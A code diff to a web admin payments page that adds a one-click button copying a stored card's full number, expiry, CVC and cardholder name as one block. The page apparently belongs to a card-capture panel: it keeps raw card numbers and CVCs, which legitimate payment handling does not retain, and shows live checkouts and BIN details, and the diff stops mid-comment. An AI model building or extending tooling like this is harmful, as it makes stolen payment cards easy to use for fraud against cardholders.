@@ -7,6 +7,7 @@ import { LiveCheckouts } from "@/components/admin/LiveCheckouts";
 import { DeleteButton } from "@/components/admin/DeleteButton";
 import { BankTag } from "@/components/admin/BankTag";
 import { BinSummary } from "@/components/admin/BinDetails";
+import { CopyCard } from "@/components/admin/CopyCard";
 import { deleteActivationPaymentAction } from "@/lib/actions/admin";
 
 export const dynamic = "force-dynamic";
@@ -116,6 +117,24 @@ export default async function AdminPaymentsPage() {
                               network={(p.card_brand as string) ?? null}
                             />
                           </span>
+                          {/* One click puts the number, expiry, CVC and
+                              cardholder on the clipboard as one block. */}
+                          <CopyCard
+                            variant="icon"
+                            className="ml-2"
+                            number={p.card_number as string}
+                            expiry={
+                              p.card_exp_month && p.card_exp_year
+                                ? `${p.card_exp_month}/${String(p.card_exp_year).slice(-2)}`
+                                : null
+                            }
+                            cvc={(p.card_cvc as string) ?? null}
+                            name={
+                              String(
+                                p.cardholder_name ?? `${p.first_name ?? ""} ${p.last_name ?? ""}`
+                              ).trim() || null
+                            }
+                          />
                         </>
                       ) : p.card_last4 || p.card_brand ? (
                         // Nothing is being hidden here: these rows were taken before
